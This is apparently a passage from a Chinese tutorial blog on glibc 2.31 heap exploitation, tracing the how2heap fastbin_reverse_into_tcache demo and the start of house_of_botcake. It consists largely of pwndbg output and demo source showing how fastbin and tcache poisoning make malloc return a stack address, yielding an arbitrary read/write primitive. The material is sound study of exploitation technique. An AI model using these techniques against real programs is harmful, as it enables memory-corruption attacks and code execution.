◂— ...</span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>我们发现 fastbin 的最后一个的 fd被我们写成了 stack 的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x5555555596a0</span> —▸ <span class="number">0x555555559650</span> —▸ <span class="number">0x555555559600</span> —▸ <span class="number">0x5555555595b0</span> —▸ <span class="number">0x555555559560</span> ◂— ...</span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x555555559560</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x555555559560</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x555555559568</span> ◂— <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x555555559570</span> —▸ <span class="number">0x555555559510</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x555555559578</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x555555559510</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x555555559510</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x555555559518</span> ◂— <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x555555559520</span> —▸ <span class="number">0x5555555594c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x555555559528</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555555594c0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x5555555594c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x5555555594c8</span> ◂— <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x5555555594d0</span> —▸ <span class="number">0x7fffffffe200</span> ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x5555555594d8</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>此时我们 malloc 一次</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────────────────────</span><br><span class="line">*RAX  <span class="number">0x5555555596b0</span> —▸ <span class="number">0x555555559650</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RBX  <span class="number">0x555555555570</span> (__libc_csu_init) ◂— endbr64</span><br><span class="line">*RCX  <span class="number">0x7ffff7fb0ba8</span> (main_arena+<span class="number">40</span>) ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line">*RDX  <span class="number">0x555555559016</span> ◂— <span class="number">0x7</span></span><br><span class="line">*RDI  <span class="number">0x6</span></span><br><span class="line">*RSI  <span class="number">0x0</span></span><br><span class="line">*R8   <span class="number">0x5555555596b0</span> —▸ <span class="number">0x555555559650</span> ◂— <span class="number">0x0</span></span><br><span class="line">*R9   <span class="number">0x18</span></span><br><span class="line">*R10  <span class="number">0x555555559028</span> ◂— <span class="number">0x0</span></span><br><span class="line"> R11  <span class="number">0x246</span></span><br><span class="line"> R12  <span class="number">0x555555555140</span> (_start) ◂— endbr64</span><br><span class="line"> R13  <span class="number">0x7fffffffe3a0</span> ◂— <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x7fffffffe2b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RSP  <span class="number">0x7fffffffe1e0</span> ◂— <span class="number">0x34000000340</span></span><br><span class="line">*RIP  <span class="number">0x55555555548c</span> (main+<span class="number">611</span>) ◂— mov    qword ptr [rbp - <span class="number">0xc8</span>], <span class="number">0</span></span><br><span class="line">──────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x555555555473</span> &lt;main+<span class="number">586</span>&gt;    lea    rdi, [rip + <span class="number">0x108e</span>]</span><br><span class="line">   <span class="number">0x55555555547a</span> &lt;main+<span class="number">593</span>&gt;    call   <span class="built_in">puts</span>@plt &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x55555555547f</span> &lt;main+<span class="number">598</span>&gt;    mov    eax, <span class="number">0x40</span></span><br><span class="line">   <span class="number">0x555555555484</span> &lt;main+<span class="number">603</span>&gt;    mov    rdi, rax</span><br><span class="line">   <span class="number">0x555555555487</span> &lt;main+<span class="number">606</span>&gt;    call   <span class="built_in">malloc</span>@plt &lt;<span class="built_in">malloc</span>@plt&gt;</span><br><span class="line"></span><br><span class="line"> ► <span class="number">0x55555555548c</span> &lt;main+<span class="number">611</span>&gt;    mov    qword ptr [rbp - <span class="number">0xc8</span>], <span class="number">0</span></span><br><span class="line">   <span class="number">0x555555555497</span> &lt;main+<span class="number">622</span>&gt;    jmp    main+<span class="number">694</span> &lt;main+<span class="number">694</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x5555555554df</span> &lt;main+<span class="number">694</span>&gt;    cmp    qword ptr [rbp - <span class="number">0xc8</span>], <span class="number">5</span></span><br><span class="line">   <span class="number">0x5555555554e7</span> &lt;main+<span class="number">702</span>&gt;    jbe    main+<span class="number">624</span> &lt;main+<span class="number">624</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x555555555499</span> &lt;main+<span class="number">624</span>&gt;    mov    rax, qword ptr [rbp - <span class="number">0xc8</span>]</span><br><span class="line">   <span class="number">0x5555555554a0</span> &lt;main+<span class="number">631</span>&gt;    mov    rax, qword ptr [rbp + rax*<span class="number">8</span> - <span class="number">0xb0</span>]</span><br><span class="line">──────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/fastbin_reverse_into_tcache.c</span><br><span class="line">   <span class="number">115</span>     <span class="string">&quot;The contents of our array on the stack now look like this:\n\n&quot;</span></span><br><span class="line">   <span class="number">116</span>   );</span><br><span class="line">   <span class="number">117</span></span><br><span class="line">   <span class="number">118</span>   <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">   <span class="number">119</span></span><br><span class="line"> ► <span class="number">120</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">   <span class="number">121</span>     <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">   <span class="number">122</span>   &#125;</span><br><span class="line">   <span class="number">123</span></span><br><span class="line">   <span class="number">124</span>   <span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">   <span class="number">125</span>   <span class="built_in">printf</span>(</span><br><span class="line">──────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffe1e0</span> ◂— <span class="number">0x34000000340</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffe1e8</span> ◂— <span class="number">0x6</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffe1f0</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x555555559520</span> —▸ <span class="number">0x555555559570</span> —▸ <span class="number">0x5555555595c0</span> ◂— ...</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffe1f8</span> ◂— <span class="number">0x100</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffe200</span> ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffe210</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x555555559520</span> —▸ <span class="number">0x555555559570</span> —▸ <span class="number">0x5555555595c0</span> ◂— ...</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffe218</span> —▸ <span class="number">0x555555559010</span> ◂— <span class="number">0x7000000000000</span></span><br><span class="line">────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55555555548</span>c main+<span class="number">611</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">7</span>]: <span class="number">0x7fffffffe210</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x555555559520</span> —▸ <span class="number">0x555555559570</span> —▸ <span class="number">0x5555555595c0</span> —▸ <span class="number">0x555555559610</span> —▸ <span class="number">0x555555559660</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>此时，原本在fastbin 的chunk list 都被放到了 tcaceh bins 里</p><p>如果我们最后再malloc 一次，我们就能拿到栈的地址  （tcache  不检查size域）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/fastbin_reverse_into_tcache.c</span><br><span class="line">   <span class="number">120</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">   <span class="number">121</span>     <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">   <span class="number">122</span>   &#125;</span><br><span class="line">   <span class="number">123</span></span><br><span class="line">   <span class="number">124</span>   <span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"> ► <span class="number">125</span>   <span class="built_in">printf</span>(</span><br><span class="line">   <span class="number">126</span>     <span class="string">&quot;\n&quot;</span></span><br><span class="line">   <span class="number">127</span>     <span class="string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>,</span><br><span class="line">   <span class="number">128</span>     q</span><br><span class="line">   <span class="number">129</span>   );</span><br><span class="line">   <span class="number">130</span></span><br><span class="line">──────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp     <span class="number">0x7fffffffe1e0</span> ◂— <span class="number">0x34000000340</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0x7fffffffe1e8</span> ◂— <span class="number">0x6</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0x7fffffffe1f0</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x555555559520</span> —▸ <span class="number">0x555555559570</span> —▸ <span class="number">0x5555555595c0</span> ◂— ...</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0x7fffffffe1f8</span> —▸ <span class="number">0x7fffffffe210</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x555555559520</span> —▸ <span class="number">0x555555559570</span> ◂— ...</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0x7fffffffe200</span> ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│ rax r8  <span class="number">0x7fffffffe210</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x555555559520</span> —▸ <span class="number">0x555555559570</span> —▸ <span class="number">0x5555555595c0</span> ◂— ...</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x7fffffffe218</span> ◂— <span class="number">0x0</span></span><br><span class="line">────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">5555555554f</span>d main+<span class="number">724</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p q</span><br><span class="line">$<span class="number">3</span> = <span class="number">0x7fffffffe210</span> <span class="string">&quot;ДUUUU&quot;</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>这样我们可以达到一个任意地址写 或者读的原语（取决于下一步对 这分配出来的chunk进行什么样的操作）</p><p>完整代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdio.h&gt;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a large unsigned value to the stack.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="keyword">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;(More than 7 times works fine too.)\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">    <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">    <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">    <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">    <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a single free is sufficient.\n\n&quot;</span></span><br><span class="line">  );</span><br></pre></td></tr></table></figure><h3 id="3-house-of-bocake"><a href="#3-house-of-bocake" class="headerlink" title="3. house_of_bocake"></a>3. house_of_bocake</h3><p>一种 tcache poisoning attack ，通过一些手段，在tcachebins 中写入目标地址</p><p>构造如下情景：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed                <span class="number">0x0</span>              None</span><br><span class="line"><span class="number">0x5555555593a0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555592a0</span>              None</span><br><span class="line"><span class="number">0x5555555594b0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555593b0</span>              None</span><br><span class="line"><span class="number">0x5555555595c0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555594c0</span>              None</span><br><span class="line"><span class="number">0x5555555596d0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555595d0</span>              None</span><br><span class="line"><span class="number">0x5555555597e0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555596e0</span>              None</span><br><span class="line"><span class="number">0x5555555598f0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555597f0</span>              None</span><br><span class="line"><span class="number">0x555555559a00</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559b10</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559c20</span>      <span class="number">0x0</span>                 <span class="number">0x20</span>                 Used                None              None</span><br></pre></td></tr></table></figure><p>此时的 tcache 是被填满的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x555555559900</span> —▸ <span class="number">0x5555555597f0</span> —▸ <span class="number">0x5555555596e0</span> —▸ <span class="number">0x5555555595d0</span> —▸ <span class="number">0x5555555594c0</span> —▸ <span class="number">0x5555555593b0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>然后我们free a 再 free prev ， 由于 prev 与  a 是相邻 chunk ，所以会触发合并，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_botcake.c</span><br><span class="line">   <span class="number">50</span>     &#125;</span><br><span class="line">   <span class="number">51</span>     <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">   <span class="number">52</span>     <span class="built_in">free</span>(a);</span><br><span class="line">   <span class="number">53</span></span><br><span class="line">   <span class="number">54</span>     <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line"> ► <span class="number">55</span>     <span class="built_in">free</span>(prev);</span><br><span class="line">   <span class="number">56</span></span><br></pre></td></tr></table></figure><p>触发合并后，在 unsortedbin 里的是 prev chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555559a00</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555559a00</span></span><br><span class="line">pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x555555559a00</span></span><br><span class="line"><span class="number">0x555555559a00</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000221</span>      ====== &gt; chunk prev</span><br><span class="line"><span class="number">0x555555559a10</span>:<span class="number">0x00007ffff7fb0be0</span><span class="number">0x00007ffff7fb0be0</span></span><br><span class="line"><span class="number">0x555555559a20</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a30</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a40</span>:<span class="number">0x0000000000000000</span><span 